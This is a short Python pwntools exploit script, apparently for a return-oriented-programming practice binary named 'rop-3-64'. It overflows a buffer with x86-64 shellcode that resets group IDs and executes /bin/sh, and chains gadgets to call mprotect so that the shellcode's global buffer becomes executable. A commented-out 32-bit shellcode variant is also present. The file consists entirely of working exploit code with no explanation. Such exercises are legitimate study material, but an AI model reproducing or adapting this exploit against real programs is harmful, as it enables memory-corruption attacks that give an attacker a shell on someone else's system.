#!/usr/bin/env python

from pwn import *
import os

context.terminal = ['tmux', 'splitw', '-h']
p = process("./rop-3-64")
#p = process("./rop-x")
#gdb.attach(p)

pop_rdi = p64(0x400743)
pop_rsi_r15 = p64(0x400741)
pop_rdx_stf = p64(0x40064a)
mprotect = p64(0x400520)
gbuf = p64(0x601080)

#32shellcode = '\xb82\x00\x00\x00\xcd\x80\x89\xc3\x89\xc1\xb8G\x00\x00\x00\xcd\x80\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00j\x00hn/shh//bi\x89\xe3\xcd\x80'
shellcode = 'H\xc7\xc0l\x00\x00\x00\x0f\x05H\x89\xc6H\x89\xc7H\xc7\xc0r\x00\x00\x00\x0f\x05H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00H\xbb//bin/shj\x00SH\x89\xe7\x0f\x05'
buf = (shellcode +("aaaabbbb")+("A"*(0x80-len(shellcode))))

#buf += p32(0x8048360) #mprotect
#buf += p32(0x804a060) #g_buf
#buf += p32(0x804a000)
#buf += p32(0x1000)
#buf += p32(7)

buf += pop_rdi
buf += p64(0x601000)
buf += pop_rsi_r15
buf += p64(0x1000)
buf += p64(0)
buf += pop_rdx_stf
buf += p64(7)
buf += p64(0)
buf += mprotect
buf += gbuf



p.sendline(buf)
p.interactive()
